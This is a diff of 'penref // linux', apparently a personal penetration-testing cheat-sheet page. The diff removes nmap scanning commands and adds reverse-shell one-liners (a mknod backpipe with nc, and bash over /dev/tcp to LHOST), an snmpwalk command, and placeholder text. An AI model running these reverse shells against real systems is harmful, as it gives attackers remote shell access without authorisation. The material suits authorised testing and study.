@@ -7,12 +7,12 @@
     <title>penref // linux</title>
     
     <!-- CSS -->
-    <link rel="stylesheet" href="/assets/bootstrap.css">
-    <link rel="stylesheet" href="/assets/main.css">
+    <link rel="stylesheet" href="assets/bootstrap.css">
+    <link rel="stylesheet" href="assets/main.css">
     <style type="text/css">
 		.hidden {display:none;}
     </style>
-    <script type="text/javascript" src="/assets/jquery.min.js"></script>
+    <script type="text/javascript" src="assets/jquery.min.js"></script>
     <script type="text/javascript">
 		$('html').addClass('hidden');
 		$(document).ready(function() {
@@ -42,17 +42,25 @@
         <div class="collapse navbar-collapse" id="navbarCollapse">
             <ul class="navbar-nav mr-auto">
                 <li class="nav-item ">
-                    <a class="nav-link" href="/">Home</a>
+                    <a class="nav-link" href="index.html">General</a>
                 </li>
                 <li class="nav-item ">
-                    <a class="nav-link" href="/windows">Windows</a>
+                    <a class="nav-link" href="windows.html">Windows</a>
                 </li>
                 <li class="nav-item active">
-                    <a class="nav-link" href="/linux">Linux</a>
+                    <a class="nav-link" href="linux.html">Linux</a>
                 </li>
                 </li>
                     <li class="nav-item ">
-                    <a class="nav-link" href="/webapp">Webapp</a>
+                    <a class="nav-link" href="webapp.html">Webapp</a>
+                </li>
+                </li>
+                    <li class="nav-item ">
+                    <a class="nav-link" href="methodology.html">Methodology</a>
+                </li>
+                </li>
+                    <li class="nav-item ">
+                    <a class="nav-link" href="extra.html">Extra</a>
                 </li>
             </ul>
             
@@ -81,73 +89,64 @@
             
             <!-- Page title and subtitle -->
             <h1 class="mt-5">
-                <code><b><i>penref // linux</i></b></code>
+                <code><b><i>linux</i></b></code>
             </h1><br>
             <section>
-                <p class="lead">How do we pop mad shells on them *nix?</p>
+                <p class="lead">Linux-specific snippets and methods</p>
 
 <!-- Enumeration -->
 <h3>Enumeration</h3>
 
-<!-- nmap -->
-<h5>nmap</h5>
 
-  
+
+
+<h3>Entry</h3>
+
+<h5>reverse shells</h5>
+   
 
 
 
 <ul class="nav nav-tabs" role="tablist">
     <li class="nav-item">
-        <a class="nav-link show active" data-toggle="tab" href="#nmap_loud">Loud</a>
+        <a class="nav-link show active" data-toggle="tab" href="#rs_mknod">mknod method</a>
     </li>
     
      
         <li class="nav-item">
-            <a class="nav-link" data-toggle="tab" href="#nmap_quiet">Quiet</a>
+            <a class="nav-link" data-toggle="tab" href="#rs_devtcp">/dev/tcp method</a>
         </li>
         
     
 </ul>
 
 <div class="tab-content">
-    <div class="tab-pane show active" id="nmap_loud">
+    <div class="tab-pane show active" id="rs_mknod">
         
-<p>Run these in parallel.</p>
+On your local computer:
 <div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -sC -sV -oG services.nmap & </code>
+<code>nc -nvlp 443</code><br>
+</div>
+On remote computer:
+<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
+<code>mknod /tmp/backpipe p && </code><br>
 </div>
 <div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -T5 -p- -oG alltcp.nmap <span class='RHOST'>RHOST</span> & </code>
+<code>/bin/sh 0< /tmp/backpipe &#124; nc <span class='LHOST'>LHOST</span> 443 1> /tmp/backpipe </code>
 </div>
-<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -sU --max-retries 3 -oG udp.nmap <span class='RHOST'>RHOST</span> & </code>
-</div><br>
-<p>Follow up by scanning each interesting port found with <span><code>-sC -sV</code></span>.</p>
-<p>If stuck, hit 'em with the:</p>
-<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -sU -p- --max-retries 3 -oG alludp.nmap <span class='RHOST'>RHOST</span></code>
-</div>
-
 
     </div>
     
     
-    <div class="tab-pane" id="nmap_quiet">
+    <div class="tab-pane" id="rs_devtcp">
         
-
-<p>Individually investigate interesting ports after output of the first command.</p>
+On local:
 <div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -sT -Pn -T1 -oG quietscan <span class='RHOST'>RHOST</span></code>
+<code>nc -nvlp 443</code><br>
 </div>
-<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>    
-<code>nmap -sC -sV -Pn -T1 -pPORT,PORT,PORT -oG ports.nmap <span class='RHOST'>RHOST</span></code>
-</div>
+On remote:
 <div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -sU -Pn -T1 --max-retries 2 -oG udp.nmap <span class='RHOST'>RHOST</span></code>
-</div><br>
-<p>Or, just scan common ports.</p>
-<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
-<code>nmap -sT -T4 -P0 -T2 -p22,80,443 -oG common.nmap <span class='RHOST'>RHOST</span> &</code>
+<code>bash -i >& /dev/tcp/<span class='LHOST'>LHOST</span>/443 0>&1</code><br>
 </div>
     </div>
     
@@ -156,10 +155,6 @@
 
 
 
-<!-- Entry -->
-<h3>Entry</h3>
-
-<!-- ssh -->
 <h5>ssh // 22</h5>
    
 
@@ -183,15 +178,12 @@
         
 bruetforcing
 
-
     </div>
     
     
     <div class="tab-pane" id="ssh_exploitation">
         
-
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
-
+There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <span><code>searchsploit</code></span> it.
 
     </div>
     
@@ -200,7 +192,34 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 
 
 
+<h5>snmp // 161</h5>
+   
 
+
+
+<ul class="nav nav-tabs" role="tablist">
+    <li class="nav-item">
+        <a class="nav-link show active" data-toggle="tab" href="#snmp_getinfo">Walk to Gather Info</a>
+    </li>
+    
+    
+</ul>
+
+<div class="tab-content">
+    <div class="tab-pane show active" id="snmp_getinfo">
+        
+Get info from v1 SNMP:
+<div class='code' onclick='copyClipboard(this)'><span class='fade'></span>
+<code>snmpwalk -c public -v1 <span class='RHOST'>RHOST</span></code>
+</div>
+
+    </div>
+    
+    
+</div><br>
+
+
+ 
 <!-- postgres -->
 <h5>postgres // 5432</h5>
 
@@ -225,7 +244,7 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 <div class="tab-content">
     <div class="tab-pane show active" id="psql_default_creds">
         
-
+postgres default creds content here
 
 
     </div>
@@ -234,7 +253,7 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
     <div class="tab-pane" id="psql_exploitation">
         
 
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
+postgres can be 'exploited' with the code exec feature. it's not a real exploit.
 
 
     </div>
@@ -303,30 +322,30 @@ Redis (4.x/5.x) RCE can be achieved through two misconfiguraitons.
 
 <ul class="nav nav-tabs" role="tablist">
     <li class="nav-item">
-        <a class="nav-link show active" data-toggle="tab" href="#bruteforcing">bruteforcing</a>
+        <a class="nav-link show active" data-toggle="tab" href="#priv1">privone</a>
     </li>
     
      
         <li class="nav-item">
-            <a class="nav-link" data-toggle="tab" href="#exploitation">exploitation</a>
+            <a class="nav-link" data-toggle="tab" href="#priv2">privtwo</a>
         </li>
         
     
 </ul>
 
 <div class="tab-content">
-    <div class="tab-pane show active" id="bruteforcing">
+    <div class="tab-pane show active" id="priv1">
         
-bruteforcing
+PRIVESC 1
 
 
     </div>
     
     
-    <div class="tab-pane" id="exploitation">
+    <div class="tab-pane" id="priv2">
         
 
-There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version, add an informational vuln. If it's not OpenSSH, <code>searchsploit</code> it.
+PRIVESC2.
 
 
     </div>
@@ -359,6 +378,7 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
     <div class="tab-pane show active" id="other_privesc">
         
 
+Lorem ipsum. Other avenues.
 
 
     </div>
@@ -368,35 +388,8 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 
 
 
-<!--  -->
-
-
- 
-
-
-
-<ul class="nav nav-tabs" role="tablist">
-    <li class="nav-item">
-        <a class="nav-link show active" data-toggle="tab" href="#other_privesc">["Standard Privesc"]</a>
-    </li>
-    
-    
-</ul>
-
-<div class="tab-content">
-    <div class="tab-pane show active" id="other_privesc">
-        
-
-
-    </div>
-    
-    
-</div><br>
-
-
-
-<!-- Informational Vulns -->
-<h5>Finding Informational Vulns</h5>
+<!-- Informational Vulns
+<h5>Finding Informational Vulns</h5>  -->
 
 
 
@@ -410,8 +403,8 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 <footer class="footer mt-auto py-3">
     <div class="container">
         <span class="text-muted">
-            @sourque // made with bootstrap and 
-            <img src="/assets/cooldoge.gif" style="width: 25px; padding-left: 0.2em; padding-bottom: 0.3em;"/>
+            @<a href="https://github.com/sourque">sourque</a> // made with bootstrap and 
+            <img src="assets/cooldoge.gif" style="width: 25px; padding-left: 0.2em; padding-bottom: 0.3em;"/>
         </span>
     </div>
 </footer>
@@ -419,8 +412,8 @@ There won't be any RCE vulnerabilities for OpenBSD ssh. If it's an older version
 
 
     <!-- JS -->
-    <script src="/assets/bootstrap.js"></script>
-    <script src="/assets/main.js"></script>
+    <script src="assets/bootstrap.js"></script>
+    <script src="assets/main.js"></script>
 
 </body>
 </html>
